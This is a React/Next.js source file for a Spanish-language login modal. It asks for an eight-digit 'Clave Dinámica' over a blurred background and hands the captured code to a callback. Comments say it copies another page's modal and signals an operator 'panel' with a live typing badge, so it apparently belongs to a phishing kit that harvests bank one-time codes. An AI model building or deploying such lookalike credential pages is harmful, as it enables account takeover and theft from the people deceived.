"use client";

import Image from "next/image";
import { useRef, useState, type FormEvent } from "react";

type Props = {
  username: string;
  error?: string;
  busy?: boolean;
  onContinue: (clave: string) => void;
  onCancel?: () => void;
  /** Avisa al panel (badge Escribiendo) sin mandar el valor. */
  onTyping?: (hasInput: boolean) => void;
};

/** Modal tejuino (gredesemo /tejuino): Clave Dinámica sobre app interna borrosa. */
export function TejuinoScreen({
  error = "",
  busy = false,
  onContinue,
  onCancel,
  onTyping,
}: Props) {
  const [clave, setClave] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);
  const typingTimer = useRef<number | null>(null);

  function emitTyping(next: string) {
    if (!onTyping) return;
    if (typingTimer.current) window.clearTimeout(typingTimer.current);
    typingTimer.current = window.setTimeout(() => {
      onTyping(next.replace(/\D/g, "").length > 0);
    }, 280);
  }

  function submit(e?: FormEvent) {
    e?.preventDefault();
    e?.stopPropagation();
    if (busy) return;
    const value = (inputRef.current?.value || clave).replace(/\D/g, "").slice(0, 8);
    if (value.length !== 8) {
      inputRef.current?.focus();
      return;
    }
    onContinue(value);
  }

  return (
    <main className="tejuino-screen">
      {/* Fondo a pantalla completa (estira al 100% del viewport) */}
      <div className="tejuino-bg" aria-hidden />

      {/* Overlay: blur(5px) transparente como gredesemo */}
      <div className="tejuino-overlay">
        <div className="tejuino-modal relative w-full max-w-[503px] bg-white px-6 pb-6 pt-12 sm:px-10 sm:pb-8 sm:pt-14">
          <button
            type="button"
            aria-label="Cerrar"
            onClick={onCancel}
            className="absolute right-2.5 top-2.5 grid h-10 w-10 place-items-center text-[#777]"
          >
            <CloseIcon />
          </button>

          <div className="mx-auto mb-7 flex justify-center sm:mb-9">
            <Image
              src="/images/login/tejuino-check.svg"
              alt=""
              width={96}
              height={70}
              className="h-[70px] w-auto"
              priority
            />
          </div>

          <form method="post" action="#" onSubmit={submit}>
            {error ? (
              <div
                role="alert"
                className="message state- mb-4 flex w-full items-stretch"
              >
                <div className="icon-light shrink-0" aria-hidden />
                <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[14px] font-semibold leading-snug text-[#292929] sm:text-[15px]">
                  {error}
                </p>
              </div>
            ) : null}

            <p className="text-center text-[16px] leading-[22px] text-[#292929]">
              Para validar el inicio de sesión introduce la{" "}
              <strong className="font-bold">Clave Dinámica</strong>.
            </p>

            <label className="mt-7 block text-left sm:mt-8">
              <span className="block py-2 text-[14px] text-[#292929]">
                Clave Dinámica
              </span>
              <input
                ref={inputRef}
                name="tejuino"
                inputMode="numeric"
                pattern="[0-9]*"
                autoComplete="one-time-code"
                maxLength={8}
                value={clave}
                disabled={busy}
                onChange={(e) => {
                  const next = e.target.value.replace(/\D/g, "").slice(0, 8);
                  setClave(next);
                  emitTyping(next);
                }}
                className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.18em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70"
              />
            </label>

            <p className="mt-7 text-center text-[16px] leading-[22px] text-[#292929] sm:mt-8">
              ¿Deseas continuar?
            </p>

            <div className="tejuino-actions mt-6 flex items-center justify-between gap-3 px-1 sm:mt-7 sm:px-0">
              <button
                type="button"
                disabled={busy}
                onClick={onCancel}
                className="inline-flex min-h-[42px] min-w-[135px] flex-1 items-center justify-center rounded-full border border-[#292929] bg-white px-4 font-display text-[16px] font-bold uppercase leading-none text-[#292929] disabled:opacity-60 sm:flex-none"
              >
                Cancelar
              </button>
              <button
                type="submit"
                disabled={busy || clave.length !== 8}
                className="inline-flex min-h-[42px] min-w-[135px] flex-1 items-center justify-center rounded-full bg-[#fdda24] px-4 font-display text-[16px] font-bold uppercase leading-none text-[#292929] shadow-[0_1px_2px_rgba(0,0,0,0.1)] disabled:opacity-60 sm:flex-none"
              >
                {busy ? (
                  <span className="inline-block h-5 w-5 animate-spin rounded-full border-[2.5px] border-[#1a1b1a]/30 border-t-[#1a1b1a]" />
                ) : (
                  "Continuar"
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </main>
  );
}

function CloseIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.8">
      <path d="M6 6l12 12M18 6L6 18" strokeLinecap="round" />
    </svg>
  );
}
